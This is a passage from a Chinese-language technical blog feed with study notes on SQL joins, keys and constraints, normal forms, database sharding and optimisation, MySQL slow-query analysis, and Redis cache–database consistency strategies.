<p>②A left join B：取A全部，B没有对应的值，则为null</p>
<p>③A right join B：取B全部，A没有对应的值，则为null</p>
<p>④A full outer join B：取并集，彼此没有对应的值为null</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403282002516.png" alt="image.png"></p>
<table>
<thead>
<tr>
<th>连接类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>INNER JOIN 内连接</td>
<td>（默认连接方式）只有当两个表都存在满足条件的记录时才会返回行。</td>
</tr>
<tr>
<td>LEFT JOIN / LEFT OUTER JOIN 左(外)连接</td>
<td>返回左表中的所有行，即使右表中没有满足条件的行也是如此。</td>
</tr>
<tr>
<td>RIGHT JOIN / RIGHT OUTER JOIN 右(外)连接</td>
<td>返回右表中的所有行，即使左表中没有满足条件的行也是如此。</td>
</tr>
<tr>
<td>FULL JOIN / FULL OUTER JOIN 全(外)连接</td>
<td>只要其中有一个表存在满足条件的记录，就返回行。</td>
</tr>
<tr>
<td>SELF JOIN</td>
<td>将一个表连接到自身，就像该表是两个表一样。为了区分两个表，在 SQL 语句中需要至少重命名一个表。</td>
</tr>
<tr>
<td>CROSS JOIN</td>
<td>交叉连接，从两个或者多个连接表中返回记录集的笛卡尔积。</td>
</tr>
</tbody>
</table>
<p>where&gt;group by&gt;having&gt;order by</p>
<p>添加更新</p>
<p>if not exists (select 1 from t where id = 1)<br>
insert into t(id, update_time) values(1, getdate())<br>
else<br>
update t set update_time = getdate() where id = 1</p>
<h1>5 外键约束</h1>
<p>外键约束的作用是维护表与表之间的关系，确保数据的完整性和一致性。</p>
<p><strong>主键</strong>：是唯一标识一条记录，不能有重复的，不允许为空，用来保证数据完整性</p>
<p><strong>外键</strong>：是另一表的主键, 外键可以有重复的, 可以是空值，用来和其他表建立联系用的。所以说，如果谈到了外键，一定是至少涉及到两张表。例如下面这两张表：</p>
<h1>6 聚合函数</h1>
<p>sum、avg、count、min、max：can be applied to a column in<br>
a SELECT clause to produce that aggregation on the column</p>
<p>使用 <code>DISTINCT</code> 可以让汇总函数值汇总不同的值。</p>
<h1>7 分组（group by）</h1>
<p>SELECT-FROM-WHERE-GROUP BY</p>
<blockquote>
<p>查询出的关系</p>
</blockquote>
<p>If any aggregation is used, then each element of the SELECT list<br>
must be either:</p>
<ol>
<li class="lvl-3">
<p>Aggregated, or</p>
</li>
<li class="lvl-3">
<p>An attribute on the GROUP BY list.</p>
</li>
</ol>
<h1>8 HAVING</h1>
<p>SELECT-FROM-WHERE-GROUP BY-HAVING</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>having</code> 用于对汇总的 <code>group by</code> 结果进行过滤。</p>
</li>
<li class="lvl-2">
<p><code>having</code> 一般都是和 <code>group by</code> 连用。</p>
</li>
<li class="lvl-2">
<p><code>where</code> 和 <code>having</code> 可以在相同的查询中。</p>
</li>
</ul>
<h1>9 组合</h1>
<h2 id="9-1-union、intersection、except">9.1 union、intersection、except</h2>
<p>满足任一条件满足所有条件满足指定条件（排除满足条件的部分）</p>
<blockquote>
<p>From Likes(drinker, beer) and Sells(bar, beer, price), Find the beer which is the favorite of ‘Lynn Conway’ or the price is above 40</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">SELECT</span> beer <span class="keyword">FROM</span> Likes</span><br><span class="line"><span class="keyword">WHERE</span> drinker<span class="operator">=</span><span class="string">&#x27;Lynn Conway&#x27;</span>)</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line">(<span class="keyword">SELECT</span> beer <span class="keyword">FROM</span> Sells</span><br><span class="line"><span class="keyword">WHERE</span> price<span class="operator">&gt;</span><span class="number">40</span>);</span><br></pre></td></tr></table></figure>
<h1>10 数据库修改</h1>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="operator">&lt;</span>relation<span class="operator">&gt;</span>(属性列表) <span class="keyword">VALUES</span> ( <span class="operator">&lt;</span>list <span class="keyword">of</span> <span class="keyword">values</span><span class="operator">&gt;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="operator">&lt;</span>relation<span class="operator">&gt;</span> (...) ( <span class="operator">&lt;</span>subquery<span class="operator">&gt;</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>relation<span class="operator">&gt;</span> <span class="keyword">WHERE</span> <span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> <span class="operator">&lt;</span>relation<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">SET</span> <span class="operator">&lt;</span>list <span class="keyword">of</span> attribute assignments<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="operator">&lt;</span><span class="keyword">condition</span> <span class="keyword">on</span> tuples<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
<h1>11 第一范式、第二范式、第三范式、BCNF</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>第一范式：列不可再分，<strong>要求数据库表的每一列都是不可分割的原子数据项。</strong></p>
</li>
<li class="lvl-2">
<p>第二范式：建立在第一范式基础上，消除部分依赖。<strong>确保数据库表中的每一列都和主键相关，而不能只与主键的某一部分相关（主要针对联合主键而言）。</strong></p>
</li>
<li class="lvl-2">
<p>第三范式：建立在第二范式基础上，消除传递依赖。<strong>第三范式需要确保数据表中的每一列数据都和主键直接相关，而不能间接相关。</strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>数据库优化</title>
    <url>/2024/03/26/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1>1 关系型数据库、非关系型数据库</h1>
<p>非关系型数据库也叫NOSQL，采用键值对的形式进行存储。</p>
<p>它的读写性能很高，易于扩展，可分为内存性数据库以及文档型数据库，比如 Redis，Mongodb，HBase等等。</p>
<p>适合使用非关系型数据库的场景：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>日志系统</p>
</li>
<li class="lvl-2">
<p>地理位置存储</p>
</li>
<li class="lvl-2">
<p>数据量巨大</p>
</li>
<li class="lvl-2">
<p>高可用</p>
</li>
</ul>
<h1>2 数据库中的主键、超键、候选键、外键是什么？</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>超键</strong>：在关系中能唯一标识<strong>元组的属性集</strong>称为关系模式的超键</p>
</li>
<li class="lvl-2">
<p><strong>候选键</strong>：不含有<strong>多余属性的超键</strong>称为候选键。也就是在候选键中，若再删除属性，就不是键了！</p>
</li>
<li class="lvl-2">
<p><strong>主键</strong>：<strong>用户选作元组标识的一个候选键程序主键</strong></p>
</li>
<li class="lvl-2">
<p><strong>外键</strong>：如果关系模式<strong>R中属性K是其它模式的主键</strong>，那么<strong>k在模式R中称为外键</strong>。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>学号</th>
<th>姓名</th>
<th>性别</th>
<th>年龄</th>
<th>系别</th>
<th>专业</th>
</tr>
</thead>
<tbody>
<tr>
<td>20020612</td>
<td>李辉</td>
<td>男</td>
<td>20</td>
<td>计算机</td>
<td>软件开发</td>
</tr>
<tr>
<td>20060613</td>
<td>张明</td>
<td>男</td>
<td>18</td>
<td>计算机</td>
<td>软件开发</td>
</tr>
<tr>
<td>20060614</td>
<td>王小玉</td>
<td>女</td>
<td>19</td>
<td>物理</td>
<td>力学</td>
</tr>
<tr>
<td>20060615</td>
<td>李淑华</td>
<td>女</td>
<td>17</td>
<td>生物</td>
<td>动物学</td>
</tr>
<tr>
<td>20060616</td>
<td>赵静</td>
<td>男</td>
<td>21</td>
<td>化学</td>
<td>食品化学</td>
</tr>
<tr>
<td>20060617</td>
<td>赵静</td>
<td>女</td>
<td>20</td>
<td>生物</td>
<td>植物学</td>
</tr>
</tbody>
</table>
<ol>
<li class="lvl-3">
<p>超键：于是我们从例子中可以发现 学号是标识学生实体的唯一标识。那么该元组的超键就为学号。除此之外我们还可以把它跟其他属性组合起来，比如：(<code>学号</code>，<code>性别</code>)，(<code>学号</code>，<code>年龄</code>)</p>
</li>
<li class="lvl-3">
<p>候选键：根据例子可知，学号是一个可以唯一标识元组的唯一标识，因此学号是一个候选键，实际上，候选键是超键的子集，比如 （学号，年龄）是超键，但是它不是候选键。因为它还有了额外的属性。</p>
</li>
<li class="lvl-3">
<p>主键：简单的说，例子中的元组的候选键为学号，但是我们选定他作为该元组的唯一标识，那么学号就为主键。</p>
</li>
<li class="lvl-3">
<p>外键是相对于主键的，比如在学生记录里，主键为学号，在成绩单表中也有学号字段，因此学号为成绩单表的外键，为学生表的主键。</p>
</li>
</ol>
<p><strong>主键为候选键的子集，候选键为超键的子集，而外键的确定是相对于主键的</strong></p>
<h1>3 数据库约束</h1>
<p>在SQL数据库中，约束是用于确保数据完整性和一致性的规则。它们定义了对表中数据的限制和规定，以确保数据的有效性和准确性。</p>
<ol>
<li class="lvl-3">
<p>主键约束（Primary Key Constraint）： 主键约束用于唯一标识表中的每一行数据，并确保该列中的值不重复且不为空。主键约束通常与表中的主键列相关联，以提供快速的数据检索和关联。</p>
</li>
<li class="lvl-3">
<p>唯一约束（Unique Constraint）： 唯一约束确保表中某列的值是唯一的，但允许空值。与主键约束不同，唯一约束允许表中存在多个唯一值，但每个值只能出现一次。</p>
</li>
<li class="lvl-3">
<p>外键约束（Foreign Key Constraint）： 外键约束用于定义表之间的关系，确保引用表中的外键值必须存在于主表中的主键列中。外键约束用于维护表之间的一致性和关联性，以实现数据的引用完整性。</p>
</li>
<li class="lvl-3">
<p>默认约束（Default Constraint）： 默认约束用于在插入新行时为列提供默认值。如果插入操作未为列提供值，则默认约束将自动分配默认值，确保数据的完整性和一致性。</p>
</li>
<li class="lvl-3">
<p>检查约束（Check Constraint）： 检查约束用于定义表中列的取值范围或条件，确保插入或更新的数据满足指定的条件。检查约束可以用于限制数据的类型、范围或格式，以确保数据的有效性和准确性。</p>
</li>
</ol>
<h1>4 数据库三大范式</h1>
<p>第一范式：无重复的列；字段不可分（原子性）第二范式：非主属性完全依赖与主关键字，而非关键字的一部分；有主键，非主键字段依赖主键（唯一性）第三范式：一个数据库表中不包含已在其它表中已包含的非主关键字信息；非主键字段不能相互依赖（<mark>每列都与主键有直接关系，不存在传递依赖</mark>）</p>
<p>部门表：部门id，部门名称员工表：员工id，部门id，（部门名称）</p>
<h1>5 数据库优化</h1>
<ol>
<li class="lvl-3">
<p>索引优化，为搜索字段创建索引</p>
</li>
<li class="lvl-3">
<p>避免使用 Select *，列出需要查询的字段</p>
</li>
<li class="lvl-3">
<p>读写分离和分库分表</p>
</li>
<li class="lvl-3">
<p>数据冷热分离</p>
</li>
<li class="lvl-3">
<p>SQL 优化</p>
</li>
<li class="lvl-3">
<p>深度分页优化</p>
</li>
<li class="lvl-3">
<p>适当冗余数据</p>
</li>
<li class="lvl-3">
<p>使用更高的硬件配置</p>
</li>
</ol>
<h2 id="5-1-SQL优化">5.1 SQL优化</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>批量操作</p>
</li>
<li class="lvl-2">
<p>小表驱动大表（小标筛选，再到大表查询）</p>
</li>
<li class="lvl-2">
<p>查询SQL尽量不要使用select *，而是具体字段</p>
</li>
<li class="lvl-2">
<p>避免再where子句中使用or来连接条件，使用union all</p>
</li>
</ul>
<h1>6 数据库优化（高并发）</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>在web服务框架中加入缓存。在服务器与数据库层之间加入缓存层，将高频访问的数据存入缓存中，减少数据库的读取负担。</p>
</li>
<li class="lvl-2">
<p>增加数据库索引，进而提高查询速度。（不过索引太多会导致速度变慢，并且数据库的写入会导致索引的更新，也会导致速度变慢）</p>
</li>
<li class="lvl-2">
<p>主从读写分离，让主服务器负责写，从服务器负责读。</p>
</li>
<li class="lvl-2">
<p>将数据库进行拆分，使得数据库的表尽可能小，提高查询的速度。</p>
</li>
<li class="lvl-2">
<p>使用分布式架构，分散计算压力。</p>
</li>
</ul>
<h1>7 读写分离</h1>
<blockquote>
<p>读写分离主要应对数据库读并发</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>部署多台数据库，选择其中的一台作为主数据库，其他的一台或者多台作为从数据库。</p>
</li>
<li class="lvl-2">
<p>保证主数据库和从数据库之间的数据是实时同步的，这个过程也就是我们常说的<strong>主从复制</strong>。</p>
</li>
<li class="lvl-2">
<p>系统将写请求交给主数据库处理，读请求交给从数据库处理。</p>
</li>
</ul>
<h1>8 数据库水平分区、垂直分区</h1>
<p>数据库的分区有两种方式：<strong>水平分区</strong>和<strong>垂直分区</strong>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>水平分区</strong>：根据某个字段的值，将数据分布到不同的表或表中不同的行。</p>
</li>
<li class="lvl-2">
<p><strong>垂直分区</strong>：根据某个字段的列值，将数据分布到不同的表中。通过合理地选择分区键，可以有效地管理大量数据]</p>
</li>
</ul>
<h1>9 分库分表</h1>
<blockquote>
<p>分库分表是一种数据库水平拆分的策略，旨在应对数据库规模不断增长导致的性能瓶颈和存储容量限制。这种策略将一个大型数据库拆分成多个较小的数据库实例（分库）和表（分表），从而提高并行处理能力、降低单个数据库实例的负载，提升整体系统的性能和可伸缩性。</p>
<p>分库分表主要解决数据库存储，避免MySQL一张表的数据量过大</p>
</blockquote>
<blockquote>
<p>[!note] 为什么要分库分表</p>
</blockquote>
<p>分库与分表的目的在于，减小数据库的单库单表负担，提高查询性能，缩短查询时间。</p>
<p><strong>通过分表</strong>，可以减少数据库的单表负担，将压力分散到不同的表上，同时因为不同的表上的数据量少了，起到提高查询性能，缩短查询时间的作用，此外，可以很大的缓解表锁的问题。 分表策略可以归纳为垂直拆分和水平拆分： <strong>水平分表</strong>：取模分表就属于随机分表，而时间维度分表则属于连续分表。 如何设计好垂直拆分，我的建议：将不常用的字段单独拆分到另外一张扩展表. 将大文本的字段单独拆分到另外一张扩展表, 将不经常修改的字段放在同一张表中，将经常改变的字段放在另一张表中。 对于海量用户场景，可以考虑取模分表，数据相对比较均匀，不容易出现热点和并发访问的瓶颈。</p>
<p><strong>库内分表</strong>，仅仅是解决了单表数据过大的问题，但并没有把单表的数据分散到不同的物理机上，因此并不能减轻 MySQL 服务器的压力，仍然存在同一个物理机上的资源竞争和瓶颈，包括 CPU、内存、磁盘 IO、网络带宽等。</p>
<p><strong>分库与分表带来的分布式困境与应对之策</strong> 数据迁移与扩容问题----一般做法是通过程序先读出数据，然后按照指定的分表策略再将数据写入到各个分表中。 分页与排序问题----需要在不同的分表中将数据进行排序并返回，并将不同分表返回的结果集进行汇总和再次排序，最后再返回给用户</p>
<blockquote>
<p>[!question] 分库分表后如何查询订阅数据库binlog日志，通过canal写到ElasticSearch，建立要搜索字段与数据库的映射</p>
</blockquote>
<h2 id="9-1-分库">9.1 分库</h2>
<p><strong>分库</strong> 就是将数据库中的数据分散到不同的数据库上，可以垂直分库，也可以水平分库。</p>
<p><strong>垂直分库</strong> 就是把单一数据库按照业务进行划分，不同的业务使用不同的数据库，进而将一个数据库的压力分担到多个数据库。</p>
<p><strong>水平分库</strong> 是把同一个表按一定规则拆分到不同的数据库中，每个库可以位于不同的服务器上，这样就实现了水平扩展，解决了单表的存储和性能瓶颈的问题。</p>
<h2 id="9-2-分表">9.2 分表</h2>
<p><strong>分表</strong> 就是对单表的数据进行拆分，可以是垂直拆分，也可以是水平拆分。</p>
<p><strong>垂直分表</strong> 是对数据表列的拆分，把一张列比较多的表拆分为多张表。<br>
<strong>水平分表</strong> 是对数据表行的拆分，把一张行比较多的表拆分为多张表，可以解决单一表数据量过大的问题。</p>
<p>水平拆分只能解决单表数据量大的问题，为了提升性能，我们通常会选择将拆分后的多张表放在不同的数据库中。也就是说，水平分表通常和水平分库同时出现。</p>
<h2 id="9-3-分片算法">9.3 分片算法</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>哈希分片</strong>：求指定分片键的哈希，然后根据哈希值确定数据应被放置在哪个表中。哈希分片比较适合随机读写的场景，不太适合经常需要范围查询的场景。哈希分片可以使每个表的数据分布相对均匀，但对动态伸缩（例如新增一个表或者库）不友好。</p>
</li>
<li class="lvl-2">
<p><strong>范围分片</strong>：按照特定的范围区间（比如时间区间、ID 区间）来分配数据，比如 将 <code>id</code> 为 <code>1~299999</code> 的记录分到第一个表， <code>300000~599999</code> 的分到第二个表。范围分片适合需要经常进行范围查找且数据分布均匀的场景，不太适合随机读写的场景（数据未被分散，容易出现热点数据的问题）。</p>
</li>
<li class="lvl-2">
<p><strong>映射表分片</strong>：使用一个单独的表（称为映射表）来存储分片键和分片位置的对应关系。映射表分片策略可以支持任何类型的分片算法，如哈希分片、范围分片等。映射表分片策略是可以灵活地调整分片规则，不需要修改应用程序代码或重新分布数据。不过，这种方式需要维护额外的表，还增加了查询的开销和复杂度。</p>
</li>
<li class="lvl-2">
<p><strong>一致性哈希分片</strong>：将哈希空间组织成一个环形结构，将分片键和节点（数据库或表）都映射到这个环上，然后根据顺时针的规则确定数据或请求应该分配到哪个节点上，解决了传统哈希对动态伸缩不友好的问题。</p>
</li>
</ul>
<h2 id="9-4-要点">9.4 要点</h2>
<ol>
<li class="lvl-3">
<p><strong>水平拆分：</strong> 分库分表是水平拆分的一种形式，与垂直拆分（按照业务模块划分表）不同。水平拆分指的是将一个表中的数据按照某个规则分散存储在多个数据库实例或表中。</p>
</li>
<li class="lvl-3">
<p><strong>分库：</strong> 将原来的单个数据库拆分成多个独立的数据库。每个数据库实例都可以独立运行在不同的物理服务器上，从而提高并发处理能力。分库通常采用数据划分的规则，比如按照用户ID的取模或哈希值进行分库。</p>
</li>
<li class="lvl-3">
<p><strong>分表：</strong> 在每个数据库中，原来的大表被拆分成多个较小的表。<mark>分表的常见策略包括按照时间范围、按照业务模块或按照数据范围等</mark>。分表可以减小每个表的数据量，提高查询性能。</p>
</li>
<li class="lvl-3">
<p><strong>数据一致性：</strong> 在分库分表的架构中，需要考虑数据一致性的问题。因为数据分散在不同的数据库和表中，应用程序需要确保对跨库、跨表的事务有良好的处理机制。</p>
</li>
<li class="lvl-3">
<p><strong>全局唯一标识：</strong> 在分库分表的情况下，通常需要一个全局唯一的标识符，以便在多个数据库和表中唯一标识一条记录。这可以是通过分布式ID生成器、UUID等方式实现的。</p>
</li>
<li class="lvl-3">
<p><strong>路由策略：</strong> 应用程序需要实现合适的路由策略，确保查询时能够正确定位到需要的数据库和表。路由策略可以基于数据划分的规则，例如用户ID的哈希值。</p>
</li>
<li class="lvl-3">
<p><strong>动态扩展：</strong> 分库分表的优势之一是能够相对容易地进行水平扩展。当数据量增加时，可以通过增加新的数据库实例或表来进行扩展，而不必改变整体系统架构。</p>
</li>
</ol>
<h1>10 数据冷热分离</h1>
<p>数据冷热分离是指根据数据的访问频率和业务重要性，将数据分为冷数据和热数据，冷数据一般存储在存储在低成本、低性能的介质中，热数据高性能存储介质中。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>优点：热数据的查询性能得到优化（用户的绝大部分操作体验会更好）、节约成本（可以冷热数据的不同存储需求，选择对应的数据库类型和硬件配置，比如将热数据放在 SSD 上，将冷数据放在 HDD 上）</p>
</li>
<li class="lvl-2">
<p>缺点：系统复杂性和风险增加（需要分离冷热数据，数据错误的风险增加）、统计效率低（统计的时候可能需要用到冷库的数据）。</p>
</li>
</ul>
<h1>11 数据库查询优化</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>索引优化：前缀索引优化；覆盖索引优化；主键索引最好是自增的；防止索引失效；</p>
</li>
<li class="lvl-2">
<p>SQL查询优化：避免使用SELECT *，而是选择需要的列。避免在WHERE子句中使用函数或运算，这可能会导致索引失效。使用LIMIT分页查询时，注意性能问题，可以考虑使用索引覆盖扫描或其他分页技术。</p>
</li>
<li class="lvl-2">
<p>启用查询缓存：启用MySQL的查询缓存功能，缓存频繁查询且结果不经常变动的查询结果。注意在数据变动频繁的场景下，查询缓存可能会成为性能瓶颈，需要谨慎使用。</p>
</li>
<li class="lvl-2">
<p>分区和分表：对大表进行分区，将数据水平分割到不同的物理区域，提高查询性能。使用分表技术，如垂直分表或水平分表，将一个大表拆分成多个小表。</p>
</li>
</ul>
<blockquote>
<p>[!question]  假如你所在的公司选择MySQL数据库作数据存储，一天五万条以上的增量，预计运维三年，你有哪些优化手段？</p>
<ul class="lvl-1">
<li class="lvl-2">设计良好的数据库结构，允许部分数据冗余，尽量避免join查询，提高效率。</li>
<li class="lvl-2">选择合适的表字段数据类型和存储引擎，适当的添加索引。</li>
<li class="lvl-2">MySQL库主从读写分离。</li>
<li class="lvl-2">找规律分表，减少单表中的数据量提高查询速度。</li>
<li class="lvl-2">添加缓存机制，比如Memcached，Apc等。</li>
<li class="lvl-2">不经常改动的页面，生成静态页面。</li>
<li class="lvl-2">书写高效率的SQL。比如 SELECT * FROM TABEL 改为 SELECT field_1, field_2, field_3 FROM TABLE。</li>
</ul>
</blockquote>
<h1>12 MySQL慢查询排查</h1>
<ol>
<li class="lvl-3">
<p><strong>开启慢查询日志</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>确保MySQL的慢查询日志已经开启。通过查看<code>slow_query_log</code>和<code>slow_query_log_file</code>变量来确认。</p>
</li>
<li class="lvl-2">
<p>如果没有开启，可以在MySQL配置文件（如<code>my.cnf</code>或<code>my.ini</code>）中设置这些变量，然后重启MySQL服务。</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p><strong>分析慢查询日志</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用<code>mysqldumpslow</code>或其他慢查询日志分析工具来查看和分析慢查询日志中的条目。</p>
</li>
<li class="lvl-2">
<p>关注查询的执行时间、锁等待时间以及被调用的次数等信息。</p>
</li>
</ul>
<ol start="3">
<li class="lvl-3">
<p><strong>使用<code>EXPLAIN</code>命令</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>对于日志中记录的慢查询，使用<code>EXPLAIN</code>命令来<mark>查看查询的执行计划</mark>。</p>
</li>
<li class="lvl-2">
<p>分析查询是否使用了合适的索引，以及是否存在全表扫描等低效操作。</p>
</li>
</ul>
<ol start="4">
<li class="lvl-3">
<p><strong>优化查询</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>根据<code>EXPLAIN</code>的输出结果，优化查询语句，比如添加或修改索引。</p>
</li>
<li class="lvl-2">
<p>避免在查询中使用<code>*</code>，而是指定需要的列。</p>
</li>
<li class="lvl-2">
<p>减少JOIN操作的数量或复杂性，特别是在大数据集上。</p>
</li>
<li class="lvl-2">
<p>考虑将计算密集型的操作移到应用层进行。</p>
</li>
</ul>
<p>作者：BAT后端A师兄<br>
链接：<a href="https://www.nowcoder.com/discuss/597116383192690688?sourceSSR=users">https://www.nowcoder.com/discuss/597116383192690688?sourceSSR=users</a><br>
来源：牛客网</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis(3)：缓存与数据库一致性</title>
    <url>/2024/03/22/%E6%95%B0%E6%8D%AE%E5%BA%93/%E7%BC%93%E5%AD%98%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%80%E8%87%B4%E6%80%A7/</url>
    <content><![CDATA[<h1>1 设计缓存</h1>
<p>缓存利用率（内存置换策略）缓存一致性（缓存与数据库一致性）缓存过期时间（过期键策略）</p>
<h1>2 保证缓存和数据库数据的一致性</h1>
<h2 id="2-1-可能的解决方案">2.1 可能的解决方案</h2>
<table>
<thead>
<tr>
<th>方式</th>
<th>存在问题</th>
<th>解决方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>先更新缓存，再更新数据库</td>
<td>更新缓存成功，更新数据库异常，导致缓存与数据库不一致</td>
<td>不考虑</td>
</tr>
<tr>
<td>先更新数据库，再更新缓存</td>
<td>更新数据库正常，更新缓存失败，数据不一致，缓存中数据一直存在</td>
<td></td>
</tr>
<tr>
<td>先删除缓存，后更新数据库</td>
<td>删除缓存后，还未更新数据库，并发下另一读请求将数据读入缓存</td>
<td>延迟双删</td>
</tr>
<tr>
<td>先更新数据库，后删除缓存</td>
<td>1. 缓存刚好失效  <br>2. 请求A查询数据库，得到一个旧值  <br>3. 请求B将新值写入数据库  <br>4. 请求B删除缓存  <br>5. 请求A将查到的旧值写入缓存</td>
<td>异步延时双删</td>
</tr>
<tr>
<td>::: level1</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="先更新数据库，后删除缓存"><em>先更新数据库，后删除缓存</em></h4>
<p>:::<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405131136393.png" alt="image.png"></p>
<h5 id="保证两个操作执行成功">保证两个操作执行成功</h5>
<h6 id="1-重试机制">1. 重试机制</h6>
<p>引入<strong>消息队列</strong>，将第二个操作（删除缓存）要操作的数据加入到消息队列，由消费者来操作数据。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果应用<strong>删除缓存失败</strong>，可以从消息队列中重新读取数据，然后再次删除缓存，这个就是<strong>重试机制</strong>。当然，如果重试超过的一定次数，还是没有成功，我们就需要向业务层发送报错信息了。</p>
</li>
<li class="lvl-2">
<p>如果<strong>删除缓存成功</strong>，就要把数据从消息队列中移除，避免重复操作，否则就继续重试。</p>
</li>
</ul>
<h6 id="2-订阅-MySQL-binlog，再操作缓存。">2. 订阅 MySQL binlog，再操作缓存。</h6>
<p>「<strong>先更新数据库，再删缓存</strong>」的策略的第一步是更新数据库，那么更新数据库成功，就会产生一条变更日志，记录在 binlog 里。于是我们就可以通过订阅 binlog 日志，拿到具体要操作的数据，然后再执行缓存删除。</p>
<h6 id="3-缓存失效时间变短">3. 缓存失效时间变短</h6>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIyOTYxNDI5OA==&amp;mid=2247487312&amp;idx=1&amp;sn=fa19566f5729d6598155b5c676eee62d&amp;chksm=e8beb8e5dfc931f3e35655da9da0b61c79f2843101c130cf38996446975014f958a6481aacf1&amp;scene=178&amp;cur_album_id=1699766580538032128#rd">缓存和数据库一致性问题，看这篇就够了 (qq.com)</a><br>
<a href="https://xiaolincoding.com/redis/architecture/mysql_redis_consistency.html#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E7%BC%93%E5%AD%98%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E4%B8%80%E8%87%B4%E6%80%A7">数据库和缓存如何保证一致性？ | 小林coding (xiaolincoding.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s/wSfgvxa9BmrrgmQTB0R-4A">聊聊如何保证Redis和Mysql中数据双写一致性</a><a href="https://mp.weixin.qq.com/s/sG7xDtLKLtlnu9ntpc5hdw">面试官常拷打：如何下保证MySQL数据库与Redis缓存数据一致性？ (qq.com)</a></p>
<h1>3 数据不一致情况</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>先删缓存，再更新数据库</p>
</li>
<li class="lvl-2">
<p>主从同步，读写分离的情况下，读从库而产生脏数据</p>
</li>
</ul>
<h1>4 缓存读写策略</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408171758999.png" alt="image.png"></p>
<h2 id="4-1-Cache-Aside-Pattern（旁路缓存模式）">4.1 Cache Aside Pattern（旁路缓存模式）</h2>
<p>Cache Aside（旁路缓存）策略是最常用的，应用程序直接与「数据库、缓存」交互，并负责对缓存的维护，该策略又可以细分为「读策略」和「写策略」。<strong>Cache Aside 策略适合读多写少的场景，不适合写多的场景</strong>，因为当写入比较频繁时，缓存中的数据会被频繁地清理，这样会对缓存的命中率有一些影响。</p>
<p><strong>写策略的步骤：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>先更新数据库中的数据，再删除缓存中的数据。</p>
</li>
</ul>
<p><strong>读策略的步骤：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果读取的数据命中了缓存，则直接返回数据；</p>
</li>
<li class="lvl-2">
<p>如果读取的数据没有命中缓存，则从数据库中读取数据，然后将数据写入到缓存，并且返回给用户。</p>
</li>
</ul>
<p><strong>缺陷 1：首次请求数据一定不在 cache 的问题</strong><br>
解决办法：可以将热点数据可以提前放入 cache 中。</p>
<p><strong>缺陷 2：写操作比较频繁的话导致 cache 中的数据会被频繁被删除，这样会影响缓存命中率 。</strong><br>
解决办法：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>数据库和缓存数据强一致场景：更新 db 的时候同样更新 cache，不过我们需要加一个锁/分布式锁来保证更新 cache 的时候不存在线程安全问题。</p>
</li>
<li class="lvl-2">
<p>可以短暂地允许数据库和缓存数据不一致的场景：更新 db 的时候同样更新 cache，但是给缓存加一个比较短的过期时间，这样的话就可以保证即使数据不一致的话影响也比较小。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403232057223.png" alt="image.png"></p>
</li>
</ul>
<h2 id="4-2-Read-Write-Through-Pattern（读写穿透）">4.2 Read/Write Through Pattern（读写穿透）</h2>
<p>Read/Write Through（读穿 / 写穿）策略原则是<strong>应用程序只和缓存交互，不再和数据库交互，而是由缓存和数据库交互</strong>，相当于更新数据库的操作由缓存自己代理了。</p>
<blockquote>
<p>Read/Write Through Pattern 中服务端把 cache 视为主要数据存储，从中读取数据并将数据写入其中。cache 服务负责将此数据读取和写入 db，从而减轻了应用程序的职责。</p>
</blockquote>
